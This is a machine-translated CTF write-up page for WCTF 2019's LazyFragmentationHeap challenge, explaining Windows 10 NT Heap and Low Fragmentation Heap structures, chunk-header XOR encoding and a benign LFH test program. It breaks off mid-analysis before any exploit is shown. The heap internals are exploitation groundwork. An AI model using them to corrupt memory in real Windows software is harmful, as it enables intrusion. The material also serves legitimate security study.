 <body style="margin-top: 56px;"><iframe style="border: medium; border-radius: 0px; box-shadow: rgba(60, 64, 67, 0.3) 0px 1px 2px, rgba(60, 64, 67, 0.15) 0px 2px 6px 2px; height: 56px; left: 0px; right: auto; position: fixed; top: 0px; transition: none 0s ease 0s; width: 100%; z-index: 2147483646; --darkreader-inline-border-top: currentcolor; --darkreader-inline-border-right: currentcolor; --darkreader-inline-border-bottom: currentcolor; --darkreader-inline-border-left: currentcolor; --darkreader-inline-boxshadow: rgba(48, 52, 54, 0.3) 0px 1px 2px, rgba(48, 52, 54, 0.15) 0px 2px 6px 2px;" title="Google Translate navigation" frameborder="0" id="gt-nvframe" src="[Writeup]%20LazyFragmentationHeap%20-%20WCTF%202019%20NULL@ROOT_files/websitetranslationui.htm" data-darkreader-inline-border-top="" data-darkreader-inline-border-right="" data-darkreader-inline-border-bottom="" data-darkreader-inline-border-left="" data-darkreader-inline-boxshadow="" class=""></iframe>
  <script type="text/javascript" src="[Writeup]%20LazyFragmentationHeap%20-%20WCTF%202019%20NULL@ROOT_files/m=navigationui" data-environment="prod" data-proxy-url="https://null2root-github-io.translate.goog" data-proxy-full-url="https://null2root-github-io.translate.goog/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html?_x_tr_sl=hr&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp" data-source-url="https://null2root.github.io/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html" data-source-language="hr" data-target-language="en" data-display-language="en" data-detected-source-language="" data-is-source-untranslated="false" data-source-untranslated-url="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=https://null2root.github.io/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html&amp;anno=2" data-client="webapp"></script>
  <div class="wrapper-normal">
   <div class="post">
    <nav class="nav">
     <ul class="list">
      <li class="item"><a class="link" href="https://null2root-github-io.translate.goog/?_x_tr_sl=hr&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp">Home</a></li>
      <li class="item"><a class="link" href="https://null2root-github-io.translate.goog/about?_x_tr_sl=hr&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp">About</a></li>
      <li class="item"><a class="link" href="https://null2root-github-io.translate.goog/history?_x_tr_sl=hr&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp">History</a></li>
      <li class="item"><a class="link" href="https://null2root-github-io.translate.goog/members?_x_tr_sl=hr&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp">Members</a></li>
      <li class="item"><a class="link" href="https://null2root-github-io.translate.goog/blog?_x_tr_sl=hr&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp">Blog</a></li>
     </ul>
    </nav>
    <h1 class="title">[Writeup] LazyFragmentationHeap - WCTF 2019</h1><span class="date"> <time datetime="07-02-2020">Friday. February 07, 2020</time> - <span class="reading-time" title="Estimated read time"> 69 mins </span> </span>
    <div class="post-tags"><a class="item" href="https://null2root-github-io.translate.goog/tags/?_x_tr_sl=hr&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp#windows">windows</a>
    </div>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Written by - y0ny0ns0n @null2root</font></font></p>
    <h1 id="목차"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">index</font></font></h1>
    <ol>
     <li><a href="https://null2root-github-io.translate.goog/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html?_x_tr_sl=hr&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp#1-%EC%86%8C%EA%B0%9C"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">introduction</font></font></a></li>
     <li><a href="https://null2root-github-io.translate.goog/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html?_x_tr_sl=hr&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp#2-%ED%99%98%EA%B2%BD-%EA%B5%AC%EC%B6%95"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Build Environment</font></font></a></li>
     <li><a href="https://null2root-github-io.translate.goog/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html?_x_tr_sl=hr&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp#3-%EB%B6%84%EC%84%9D">분석</a><br>
       3.1. <a href="https://null2root-github-io.translate.goog/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html?_x_tr_sl=hr&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp#31-_heap">_HEAP</a><br>
       3.2. <a href="https://null2root-github-io.translate.goog/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html?_x_tr_sl=hr&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp#32-_heap_entry">_HEAP_ENTRY</a><br>
       3.3. <a href="https://null2root-github-io.translate.goog/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html?_x_tr_sl=hr&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp#33-_heap_list_lookup">_HEAP_LIST_LOOKUP</a><br>
       3.4. <a href="https://null2root-github-io.translate.goog/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html?_x_tr_sl=hr&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp#34-_lfh_heap">_LFH_HEAP</a><br>
       3.5. <a href="https://null2root-github-io.translate.goog/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html?_x_tr_sl=hr&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp#35-_heap_bucket">_HEAP_BUCKET</a><br>
       3.6. <a href="https://null2root-github-io.translate.goog/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html?_x_tr_sl=hr&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp#36-_heap_local_segment_info">_HEAP_LOCAL_SEGMENT_INFO</a><br>
       3.7. <a href="https://null2root-github-io.translate.goog/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html?_x_tr_sl=hr&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp#37-_heap_subsegment">_HEAP_SUBSEGMENT</a><br>
       3.8. <a href="https://null2root-github-io.translate.goog/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html?_x_tr_sl=hr&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp#38-_heap_userdata_header">_HEAP_USERDATA_HEADER</a><br>
       3.9. <a href="https://null2root-github-io.translate.goog/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html?_x_tr_sl=hr&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp#39-_interlock_seq">_INTERLOCK_SEQ</a><br>
       3.10. <a href="https://null2root-github-io.translate.goog/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html?_x_tr_sl=hr&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp#310-allocate-and-free-non-lfh-chunk">Allocate and Free Non-LFH chunk</a><br>
       3.11. <a href="https://null2root-github-io.translate.goog/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html?_x_tr_sl=hr&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp#311-allocate-and-free-lfh-chunk">Allocate and Free LFH chunk</a><br></li>
     <li><a href="https://null2root-github-io.translate.goog/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html?_x_tr_sl=hr&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp#4-%EC%9D%B5%EC%8A%A4%ED%94%8C%EB%A1%9C%EC%9E%87"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">exploit</font></font></a></li>
     <li><a href="https://null2root-github-io.translate.goog/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html?_x_tr_sl=hr&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp#5-%ED%9B%84%EA%B8%B0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">review</font></font></a></li>
     <li><a href="https://null2root-github-io.translate.goog/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html?_x_tr_sl=hr&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp#6-%EC%B0%B8%EA%B3%A0%EC%9E%90%EB%A3%8C"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">References</font></font></a></li>
    </ol>
    <h1 id="1-소개"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. Introduction</font></font></h1>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Starting
 this year, my overall study direction was Windows + α, and I became 
interested in Windows 10 NT Heap, so I looked for related documents and 
came across this problem and decided to try to solve it.</font></font></p>
    <p><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LazyFragmentationHeap</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> is a problem raised by </font></font><a href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=https://twitter.com/scwuaptx"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Angelboy</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> at WCTF 2019 , </font><font style="vertical-align: inherit;">and is related to Windows' </font></font><a href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=https://docs.microsoft.com/en-us/windows/win32/memory/low-fragmentation-heap"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Low Fragmentation Heap (commonly known as LFH).</font></font></a><font style="vertical-align: inherit;"></font></p>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">As I said before, I chose this problem to study this topic, so there may be errors in the content of the document I am writing. </font><font style="vertical-align: inherit;">If you find such an error, please let us know through the Disqus comment at the bottom.</font></font></p>
    <h1 id="2-환경-구축"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. Building the environment</font></font></h1>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Virtual machine + problem file: https://github.com/scwuaptx/LazyFragmentationHeap#vm</font></font></p>
    <ul>
     <li>Windows 10 Pro Version 1903 (OS Build 18362.30)</li>
     <li>VirtualBox 6.1.2</li>
    </ul>
    <p><strong><font style="vertical-align: inherit;"></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">If you run </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">start.bat</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> in </font><strong><font style="vertical-align: inherit;">the C:\Users\wctf2019\Desktop\challenge</font></strong><font style="vertical-align: inherit;"> directory , you can remotely access the challenge file through </font></font><a href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=https://github.com/trailofbits/AppJailLauncher"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AppJailLauncher as shown below.</font></font></a><font style="vertical-align: inherit;"></font></p>
    <p><img src="[Writeup]%20LazyFragmentationHeap%20-%20WCTF%202019%20NULL@ROOT_files/lazyfragmentationheap-pic1.png" alt="appjaillauncher worked"></p>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The VM running the problem file is </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 10 Pro Version 1903 (OS Build 18362.30)</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , as indicated earlier, and the analysis of LFH, excluding the analysis of the problem file, </font><font style="vertical-align: inherit;">is based on my host OS version, </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 10 Pro Version 1909 (18363.592).</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> I'm doing it.</font></font></p>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Fortunately, perhaps because the difference between the two versions was not large, when I compared the differences in </font><strong><font style="vertical-align: inherit;">ntdll.dll</font></strong><font style="vertical-align: inherit;"> using </font></font><a href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=https://www.zynamics.com/bindiff.html"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BinDiff</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , there were no major changes as shown below, so I thought it would be okay.</font></font><strong><font style="vertical-align: inherit;"></font></strong><font style="vertical-align: inherit;"></font></p>
    <p><img src="[Writeup]%20LazyFragmentationHeap%20-%20WCTF%202019%20NULL@ROOT_files/lazyfragmentationheap-pic2.png" alt="ntdll bindiff"></p>
    <h1 id="3-분석"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. Analysis</font></font></h1>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The Windows Heap allocation mechanism is divided into </font><font style="vertical-align: inherit;">the existing </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NT Heap and </font></font></strong><font style="vertical-align: inherit;"></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Segment Heap</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , which was added starting with Windows 10 .</font></font></p>
    <p><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The Segment Heap</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 is already used in Edge Browser and most UWP apps and is a very 
interesting topic, but since the LFH we will analyze this time is a 
feature included in </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">the NT Heap</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> that has been used since the Windows Vista era , we will analyze it next time if we have the opportunity.</font></font></p>
    <p><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NT Heap</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> is largely divided into Front-End and Back-End, with Front-End meaning LFH. </font><font style="vertical-align: inherit;">If LFH is disabled, allocating heap memory will immediately proceed to Back-End.</font></font></p>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LFH, which corresponds to the front-end, is not involved in actual heap memory allocation, and as the name </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Low Fragmentation Heap</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> suggests , it is used to manage heap memory more efficiently by alleviating </font></font><a href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=https://ko.wikipedia.org/wiki/%25EB%258B%25A8%25ED%258E%25B8%25ED%2599%2594"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">fragmentation</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> between allocated heap memories .</font></font></p>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LFH is automatically activated when you allocate multiple heap memories of the same size as in the code below. </font><font style="vertical-align: inherit;">One
 thing to note here is that if the size of the allocated heap memory is 
larger than 16KB (0x4000), LFH does not manage the memory.</font></font></p>
    <div class="language-c highlighter-rouge">
     <div class="highlight">
      <pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;Windows.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">LPVOID</span> <span class="o">*</span><span class="n">ptr_arr</span><span class="p">[</span><span class="mi">80</span><span class="p">];</span>
        <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>

        <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">80</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
                <span class="n">ptr_arr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">);</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">"[+] find Heap base address using </span><span class="se">\"</span><span class="s">!heap -x %p</span><span class="se">\"</span><span class="s"> command</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ptr_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[+] check if LFH was enabled</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">getchar</span><span class="p">();</span>

        <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">80</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
                <span class="n">free</span><span class="p">(</span><span class="n">ptr_arr</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre>
     </div>
    </div>
    <p><img src="[Writeup]%20LazyFragmentationHeap%20-%20WCTF%202019%20NULL@ROOT_files/lazyfragmentationheap-pic3.png" alt="LFH enable/disable"></p>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Although it is necessary, all heap memory allocated in Windows is managed through the _HEAP structure. If you </font><font style="vertical-align: inherit;">allocate using the standard </font><strong><font style="vertical-align: inherit;">malloc()</font></strong><font style="vertical-align: inherit;"> function as in the test code above without using the private heap created with the </font></font><a href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapcreate"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HeapCreate()</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> function, it is stored in </font><a href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=https://ko.wikipedia.org/wiki/%25ED%2594%2584%25EB%25A1%259C%25EC%2584%25B8%25EC%258A%25A4_%25ED%2599%2598%25EA%25B2%25BD_%25EB%25B8%2594%25EB%25A1%259D"><font style="vertical-align: inherit;">PEB</font></a><font style="vertical-align: inherit;"> . (Uses the default Heap memory)</font></font><strong><font style="vertical-align: inherit;"></font></strong><font style="vertical-align: inherit;"></font><a href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=https://ko.wikipedia.org/wiki/%25ED%2594%2584%25EB%25A1%259C%25EC%2584%25B8%25EC%258A%25A4_%25ED%2599%2598%25EA%25B2%25BD_%25EB%25B8%2594%25EB%25A1%259D"><font style="vertical-align: inherit;"></font></a><font style="vertical-align: inherit;"></font></p>
    <p><img src="[Writeup]%20LazyFragmentationHeap%20-%20WCTF%202019%20NULL@ROOT_files/lazyfragmentationheap-pic4.png" alt="_PEB-&gt;ProcessHeap"></p>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">When LFH is activated, </font><font style="vertical-align: inherit;">the address of the newly allocated LFH is entered in </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_HEAP-&gt;FrontEndHeap , and 2 is entered in </font></font></strong><font style="vertical-align: inherit;"></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_HEAP-&gt;FrontEndHeapType.</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> This value </font><font style="vertical-align: inherit;">can be read through the </font></font><a href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapqueryinformation"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HeapQueryInformation() function and used to distinguish whether the LFH is activated.</font></font></a><font style="vertical-align: inherit;"></font></p>
    <p><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">In addition to _HEAP-&gt;FrontEndHeap,</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> structures containing values ​​used by LFH are schematically connected as shown below.</font></font></p>
    <p><img src="[Writeup]%20LazyFragmentationHeap%20-%20WCTF%202019%20NULL@ROOT_files/lazyfragmentationheap-pic5.png" alt="NT Heap Structure"></p>
    <ul>
     <li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The
 fact that arrows starting from different structure members point to the
 same structure does not mean that the members actually have the same 
value, just because they use the same structure.</font></font></strong></li>
     <li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Arrows are not used for members pointing to the following structures connected as a Linked List.</font></font></strong></li>
     <li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">For structure members that are not pointers, the structure type is specified below the name.</font></font></strong></li>
    </ul>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">In
 order to understand LFH, I think it is necessary to first find out what
 functions the various objects above perform, so I have referred to 
several documents and summarized them as follows. If there are any 
mistakes or shortcomings, please let me know through the Disqus comments
 at the bottom.</font></font></p>
    <h2 id="용어-정리"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Glossary of Terms</font></font></h2>
    <ul>
     <li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bucket</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> : Heap chunks allocated to LFH are classified and grouped by size, and </font><font style="vertical-align: inherit;">are also called </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UserBlock .</font></font></strong><font style="vertical-align: inherit;"></font></li>
     <li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SubSegment</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> : Refers to the </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_HEAP_SUBSEGMENT</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> structure used by LFH to efficiently manage heap memory . If the heap chunk size is different, different SubSegments are used.</font></font></li>
    </ul>
    <h2 id="31-_heap">3.1. <a href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=https://www.vergiliusproject.com/kernels/x64/Windows%252010%2520%257C%25202016/1903%252019H1%2520(May%25202019%2520Update)/_HEAP">_HEAP</a></h2>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: The most core structure used to manage the allocated heap memory area.</font></font></p>
    <ul>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">EncodeFlagMask:
 Value used to determine whether the Heap chunk header has been encoded,
 set to 0x100000 when initializing the Heap.</font></font></li>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Encoding: Used for XOR encoding to prevent heap headers from being tampered with.</font></font></li>
     <li><font style="vertical-align: inherit;"></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BlocksIndex: Indicates the _HEAP_LIST_LOOKUP</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> structure </font><font style="vertical-align: inherit;">used to manage heap chunks in the back-end.</font></font></li>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FreeLists: Points to </font><strong><font style="vertical-align: inherit;">the _HEAP_ENTRY</font></strong><font style="vertical-align: inherit;"> structure </font><font style="vertical-align: inherit;">of the deallocated Heap chunk, similar to the </font></font><a href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=https://github.com/bminor/glibc/blob/d614a75/malloc/malloc.c%23L1491-L1501"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">unsorted bin used in glibc.</font></font></a><font style="vertical-align: inherit;"></font><strong><font style="vertical-align: inherit;"></font></strong><font style="vertical-align: inherit;"></font></li>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FrontEndHeap: When LFH is disabled, it is initialized to 0, but when LFH is enabled, it points to the allocated </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_LFH_HEAP</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> structure.</font></font></li>
    </ul>
    <h2 id="32-_heap_entry">3.2. <a href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=https://www.vergiliusproject.com/kernels/x64/Windows%252010%2520%257C%25202016/1909%252019H2%2520(November%25202019%2520Update)/_HEAP_ENTRY">_HEAP_ENTRY</a></h2>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;" class="">: </font><font style="vertical-align: inherit;" class="">A structure that serves as the header of the allocated Heap chunk, like the </font></font><a href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=https://github.com/bminor/glibc/blob/d614a75/malloc/malloc.c%23L1079-L1083"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;" class="">header part of the malloc_chunk structure used in glibc. </font></font></a><font style="vertical-align: inherit;"></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
      (Because it is XOR encoded in different ways depending on whether 
it is LFH or not, a decoding process is required to know the actual 
value.)</font></font></p>
    <h3 id="non-lfh-chunk">Non-LFH chunk</h3>
    <p><img src="[Writeup]%20LazyFragmentationHeap%20-%20WCTF%202019%20NULL@ROOT_files/lazyfragmentationheap-pic6.png" alt="decoding _HEAP_ENTRY"></p>
    <ul>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PreviousBlockPrivateData: Stores the value of the previously allocated heap chunk, usually initialized to 0.</font></font></li>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Size: Size of the heap chunk including </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">the _HEAP_ENTRY</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> structure. The original value can be obtained by multiplying by 0x10.</font></font></li>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Flags: Used to identify whether the heap chunk is in use ( BUSY, 1 ) or deallocated ( FREE, 0 ).</font></font></li>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SmallTagIndex: </font><font style="vertical-align: inherit;">Holds the value obtained by XORing the first 3 bytes of the </font><strong><font style="vertical-align: inherit;">_HEAP_ENTRY</font></strong><font style="vertical-align: inherit;"> structure ( excluding </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PreviousBlockPrivateData ) and is used to verify the integrity of the header.</font></font></strong><font style="vertical-align: inherit;"></font><strong><font style="vertical-align: inherit;"></font></strong><font style="vertical-align: inherit;"></font></li>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PreviousSize:
 This is the size of the previously allocated Heap chunk, and the 
original value can be obtained by multiplying by 0x10.</font></font></li>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UnusedBytes:
 Used to specify the remaining memory size after allocation. If the 8th 
bit of this member is 1 (UnusedBytes OR 0x80 == 1), this chunk is 
recognized as an LFH chunk.</font></font></li>
    </ul>
    <h3 id="lfh-chunk">LFH chunk</h3>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">In the case of LFH chunk, </font><font style="vertical-align: inherit;">the result of the XOR operation as shown below is stored in </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SubSegmentCode .</font></font></strong><font style="vertical-align: inherit;"></font></p>
    <div class="language-plaintext highlighter-rouge">
     <div class="highlight">
      <pre class="highlight"><code>((&amp;_HEAP_ENTRY - &amp;_HEAP_USERDATA_HEADER) &lt;&lt; 0xC) ^
(&amp;_HEAP_ENTRY &gt;&gt; 4) ^
&amp;_HEAP ^
pLFHKey
</code></pre>
     </div>
    </div>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Through this result, </font><font style="vertical-align: inherit;">you can find </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">the _HEAP_USERDATA_HEADER</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> structure and </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_HEAP_SUBSEGMENT structure of the corresponding LFH chunk as shown below.</font></font></strong><font style="vertical-align: inherit;"></font></p>
    <p><img src="[Writeup]%20LazyFragmentationHeap%20-%20WCTF%202019%20NULL@ROOT_files/lazyfragmentationheap-pic7.png" alt="decoding _HEAP_ENTRY of LFH chunk"></p>
    <ul>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SubSegmentCode: Used to find </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">the _HEAP_USERDATA_HEADER</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> structure and </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">the _HEAP_SUBSEGMENT</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> structure.</font></font></li>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PreviousSize: (although confusing because of the name) </font><font style="vertical-align: inherit;">Used as an index value to find the bit connected to the corresponding Heap chunk in </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_HEAP_USERDATA_HEADER-&gt;BitmapData</font></font></strong><font style="vertical-align: inherit;"></font></li>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UnusedBytes:
 Used to specify the remaining memory size after allocation. If the 8th 
